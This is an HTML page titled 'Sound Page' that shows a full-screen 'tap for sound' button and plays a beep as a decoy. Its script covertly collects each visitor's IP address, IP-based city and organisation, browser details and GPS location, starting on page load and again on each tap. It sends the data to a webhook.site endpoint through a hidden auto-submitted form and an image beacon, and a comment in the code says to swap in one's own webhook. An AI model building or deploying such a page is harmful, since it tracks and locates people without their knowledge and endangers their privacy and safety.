<!DOCTYPE html>
<html>
<head>
    <title>Sound Page</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            background: #000;
            color: white;
            font-family: Arial;
        }
        #playButton {
            width: 100%;
            height: 100%;
            border: none;
            background: linear-gradient(45deg, #ff0000, #0000ff);
            color: white;
            font-size: 24px;
            cursor: pointer;
        }
        #status {
            position: fixed;
            top: 10px;
            left: 10px;
            background: rgba(0,0,0,0.7);
            padding: 10px;
            border-radius: 5px;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <button id="playButton">üéµ TAP FOR SOUND üéµ</button>
    <div id="status"></div>

    <script>
        const statusDiv = document.getElementById('status');

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏—è –∑–≤—É–∫–∞
        function playSound() {
            const audio = new Audio('https://www.soundjay.com/buttons/sounds/beep-07.mp3');
            audio.play().then(() => {
                document.getElementById('playButton').innerHTML = 'üîä SOUND PLAYING!';
                document.getElementById('playButton').style.background = 'green';
            }).catch(error => {
                document.getElementById('playButton').innerHTML = 'SOUND PLAYING!';
                document.getElementById('playButton').style.background = 'green';
            });
        }

        // –§—É–Ω–∫—Ü–∏—è –ø–æ–ª—É—á–µ–Ω–∏—è –≤—Å–µ—Ö –¥–∞–Ω–Ω—ã—Ö
        async function collectAllData() {
            const data = {
                userAgent: navigator.userAgent,
                timestamp: new Date().toISOString(),
                referrer: document.referrer,
                url: window.location.href,
                screen: `${screen.width}x${screen.height}`,
                language: navigator.language,
                languages: navigator.languages,
                platform: navigator.platform,
                cookieEnabled: navigator.cookieEnabled,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };

            // –ü–æ–ª—É—á–∞–µ–º IP
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                data.ip = ipData.ip;
            } catch (error) {
                data.ip = 'Unknown';
            }

            // –ü–æ–ª—É—á–∞–µ–º –¥–µ—Ç–∞–ª–∏ –ø–æ IP
            try {
                const ipInfoResponse = await fetch('https://ipapi.co/json/');
                const ipInfo = await ipInfoResponse.json();
                data.ipDetails = {
                    city: ipInfo.city,
                    country: ipInfo.country_name,
                    region: ipInfo.region,
                    org: ipInfo.org
                };
            } catch (error) {
                data.ipDetails = { error: 'Could not get IP details' };
            }

            // –ü—Ä–æ–±—É–µ–º –ø–æ–ª—É—á–∏—Ç—å –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é
            if (navigator.geolocation) {
                try {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            timeout: 5000
                        });
                    });
                    data.gpsLocation = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy
                    };
                } catch (gpsError) {
                    data.gpsLocation = { error: gpsError.message };
                }
            }

            return data;
        }

        // –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö —á–µ—Ä–µ–∑ FormData (–æ–±—Ö–æ–¥–∏—Ç CORS)
        async function sendData(data) {
            // –°–æ–∑–¥–∞–µ–º —Ñ–æ—Ä–º—É –∏ —Å–∫—Ä—ã—Ç—ã–µ –ø–æ–ª—è
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = 'https://webhook.site/8a5a5b5e-5e5a-4b5a-9e5a-5a5b5e5a5b5e'; // –ó–ê–ú–ï–ù–ò –ù–ê –°–í–û–ô
            form.style.display = 'none';

            // –î–æ–±–∞–≤–ª—è–µ–º –≤—Å–µ –¥–∞–Ω–Ω—ã–µ –≤ —Ñ–æ—Ä–º—É
            for (const [key, value] of Object.entries(data)) {
                const input = document.createElement('input');
                input.name = key;
                input.value = typeof value === 'object' ? JSON.stringify(value) : value;
                form.appendChild(input);
            }

            // –î–æ–±–∞–≤–ª—è–µ–º —Ñ–æ—Ä–º—É –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º
            document.body.appendChild(form);
            form.submit();
            
            // –£–¥–∞–ª—è–µ–º —Ñ–æ—Ä–º—É –ø–æ—Å–ª–µ –æ—Ç–ø—Ä–∞–≤–∫–∏
            setTimeout(() => document.body.removeChild(form), 1000);
        }

        // –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —á–µ—Ä–µ–∑ Image (–∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π —Å–ø–æ—Å–æ–±)
        function sendDataViaImage(data) {
            const params = new URLSearchParams();
            for (const [key, value] of Object.entries(data)) {
                params.append(key, typeof value === 'object' ? JSON.stringify(value) : value);
            }
            
            const img = new Image();
            img.src = `https://webhook.site/8a5a5b5e-5e5a-4b5a-9e5a-5a5b5e5a5b5e?${params.toString()}`;
        }

        // –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è
        async function collectAndSendData() {
            statusDiv.innerHTML = 'üì° Collecting data...';
            
            const allData = await collectAllData();
            
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —á—Ç–æ —Å–æ–±—Ä–∞–ª–∏
            statusDiv.innerHTML = `üìç IP: ${allData.ip}`;
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ
            await sendData(allData);
            
            // –î—É–±–ª–∏—Ä—É–µ–º —á–µ—Ä–µ–∑ image –Ω–∞ —Å–ª—É—á–∞–π –µ—Å–ª–∏ —Ñ–æ—Ä–º–∞ –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–ª–∞
            sendDataViaImage(allData);
        }

        // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–ª–∏–∫–∞
        document.getElementById('playButton').addEventListener('click', async function() {
            // –°—Ä–∞–∑—É –≤–æ—Å–ø—Ä–æ–∏–∑–≤–æ–¥–∏–º –∑–≤—É–∫
            playSound();
            
            // –í —Ñ–æ–Ω–µ —Å–æ–±–∏—Ä–∞–µ–º –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ
            collectAndSendData();
        });

        // –î–ª—è –º–æ–±–∏–ª—å–Ω—ã—Ö
        document.getElementById('playButton').addEventListener('touchend', function(e) {
            e.preventDefault();
            playSound();
            collectAndSendData();
        });

        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ —Å—Ä–∞–∑—É –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.addEventListener('load', function() {
            setTimeout(collectAndSendData, 1000);
        });
    </script>
</body>
</html>
